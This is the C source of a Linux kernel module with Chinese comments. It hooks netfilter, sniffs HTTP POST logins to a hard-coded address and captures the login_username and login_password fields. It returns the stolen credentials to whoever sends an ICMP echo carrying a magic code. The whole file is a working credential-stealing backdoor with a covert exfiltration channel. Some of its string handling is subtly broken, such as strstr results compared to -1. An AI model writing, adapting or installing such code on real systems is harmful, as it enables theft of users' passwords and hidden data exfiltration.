#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/netdevice.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>

#define MAGIC_CODE 0x77 // ICMP CODE
#define REPLY_SIZE 36   // tartget_ip(4B) + username(16B) + password(16B)

#define SUCCESS  1
#define FAILURE -1

static const char *post_uri   = "POST /index.php";
static const int post_uri_len = 15;
static const unsigned int target_ip = 2206378176; // 192.168.130.131

static char *username = NULL;
static char *password = NULL;

static struct nf_hook_ops pre_hook;
static struct nf_hook_ops post_hook;

static unsigned int findpkt_iwant(struct sk_buff *skb) {
    struct iphdr *ip = NULL;
    struct tcphdr *tcp = NULL;
    unsigned char *data = NULL;
    int tcp_payload_len = 0;
    ip = (struct iphdr *)skb_network_header(skb);
    if (ip->daddr != target_ip || ip->protocol != IPPROTO_TCP)
        return FAILURE;
    tcp = (struct tcphdr *)skb_transport_header(skb);
    tcp_payload_len = ntohs(ip->tot_len) - (ip->ihl<<2) - (tcp->doff<<2);
    data = (unsigned char *)((unsigned char *)tcp + (tcp->doff<<2));
    printk("len: %d, data: %s", tcp_payload_len, data);
    printk("----------------------------------");
    if (tcp->dest != htons(80)
        || tcp_payload_len < post_uri_len
        || strncmp(data, post_uri, post_uri_len) != 0) {
        return FAILURE;
    }
    return SUCCESS;
}

char * fetch_urlparam(char *urlparam, int ulen, char *key, int klen) {
    int index = 0, i = 0;
    char *value = NULL;
    // printk("fetch_urlparam line: 56");
    if ((index = strstr(urlparam, key)) == -1) // index是key在urlparam中首次出现的下标
        return NULL;
    urlparam += (index + klen); // 下标跳过key移动到值部分
    ulen -= (index + klen); // 计算value的实际长度
    for (i = 0; i < ulen && urlparam[i] != '&'; i++);
    if (i >= ulen)
        return NULL;
    // printk("fetch_urlparam line: 64");
    // i + 1, for the last char '\0'
    if ((value = (char *)kmalloc(sizeof(char)*(i+1), GFP_KERNEL)) == NULL)
        return NULL;
    memcpy(value, urlparam, i);
    value[i] = '\0';
    return value;
}

static void fetch_http(struct sk_buff *skb) {
    struct iphdr *ip = NULL;
    struct tcphdr *tcp = NULL;
    char *data = NULL;   // tcp data
    int tcp_payload_len = 0;
    int i = 0, index = -1;
    int content_len = 0; // Cotent-Length
    printk("fetch_http line: 80");
    ip = (struct iphdr *)skb_network_header(skb);
    tcp = (struct tcphdr *)skb_transport_header(skb);
    tcp_payload_len = ntohs(ip->tot_len) - (ip->ihl<<2) - (tcp->doff<<2);
    data = (char *)tcp + (tcp->doff<<2);
    printk("fetch_http line: 85");
    index = strstr(data, "Content-Length: ");
    if (index == -1)
        return;
    data += (index + 16); 
    for (i = 0; data[i] != '\r'; i++) // 计算请求体大小（url携带的参数长度）
        content_len = content_len*10 + ((int)data[i]-'0');  // Cotent-Length
    data = (char *)tcp + (tcp->doff<<2) + (tcp_payload_len-content_len);
    // 提取用户名
    username = fetch_urlparam(data, content_len, "login_username=", 15);
    // 提取密码
    password = fetch_urlparam(data, content_len, "login_password=", 15);
    if (username == NULL || password == NULL)
        return;
    printk("login_username: %s\n", username);
    printk("login_password: %s\n", password);
}

static int hasPair(void) {
    return username != NULL && password != NULL;
}

static unsigned int watch_out(void *priv,
                              struct sk_buff *skb,
                              const struct nf_hook_state *state) {
    printk("watch_out line: 110\n");
    if (findpkt_iwant(skb) == FAILURE)
        return NF_ACCEPT;
    if (!hasPair())
        fetch_http(skb);
    return NF_ACCEPT;
}

static unsigned int watch_in(void *priv,
                             struct sk_buff *skb,
                             const struct nf_hook_state *state) {
    struct iphdr *ip = NULL;
    struct icmphdr *icmp = NULL;
    int icmp_payload_len = 0;
    char *cp_data = NULL; 	  // copy pointer
    unsigned int temp_ipaddr; // temporary ip holder for swap ip (saddr <-> daddr)
    printk("watch_in line: 125\n");
    printk("username: %s, password: %s", username, password);
    ip = (struct iphdr *)skb_network_header(skb);
    if (!hasPair() || ip->protocol != IPPROTO_ICMP)
        return NF_ACCEPT;
    printk("watch_in line: 129");
    icmp = (struct icmphdr *)((char *)ip + (ip->ihl<<2));
    // 最后8字节为 ICMP首部长度
    icmp_payload_len = ntohs(ip->tot_len) - (ip->ihl<<2) - 8;
    if (icmp->code != MAGIC_CODE
        || icmp->type != ICMP_ECHO
        || icmp_payload_len < REPLY_SIZE) {
        return NF_ACCEPT;
    }
    printk("watch_in line: 138");
    // 交换源目的IP用于回发数据
    temp_ipaddr = ip->saddr;
    ip->saddr = ip->daddr;
    ip->daddr = temp_ipaddr;

    skb->pkt_type = PACKET_OUTGOING;
    switch (skb->dev->type) {
        case ARPHRD_PPP: break;
        case ARPHRD_LOOPBACK:
        case ARPHRD_ETHER: {
            unsigned char temp_hwaddr[ETH_ALEN];
            struct ethhdr *eth = NULL;
            // Move the data pointer to point to the link layer header
            eth = (struct ethhdr *)eth_hdr(skb);
            skb->data = (unsigned char*)eth;
            skb->len += ETH_HLEN; // 14, sizeof(skb->mac.ethernet);
            memcpy(temp_hwaddr, eth->h_dest, ETH_ALEN);
            memcpy(eth->h_dest, eth->h_source, ETH_ALEN);
            memcpy(eth->h_source, temp_hwaddr, ETH_ALEN);
            break;
        }
    }

    // copy target_ip, username, password into packet
    cp_data = (char *)icmp + 8;
    memcpy(cp_data, &target_ip, 4);
    memcpy(cp_data+4, username, 16);
    memcpy(cp_data+20, password, 16);

    printk("login_username: %s\n", username);
    printk("login_password: %s\n", password);
    dev_queue_xmit(skb); // 发送数据帧
    kfree(username);
    kfree(password);
    username = password = NULL;
    return NF_STOLEN;
}

int init_module(void) {
    pre_hook.hook = watch_in;
    pre_hook.pf = PF_INET;
    pre_hook.hooknum = NF_INET_PRE_ROUTING;
    pre_hook.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &pre_hook);

    post_hook.hook = watch_out;
    post_hook.pf = PF_INET;
    post_hook.hooknum = NF_INET_POST_ROUTING;
    post_hook.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &post_hook);
    printk("_________________init_module\n");
    return 0;
}

void cleanup_module(void) {
    nf_unregister_net_hook(&init_net, &pre_hook);
    nf_unregister_net_hook(&init_net, &post_hook);
    printk("_________________cleanup_module\n");
}
MODULE_LICENSE("GPL");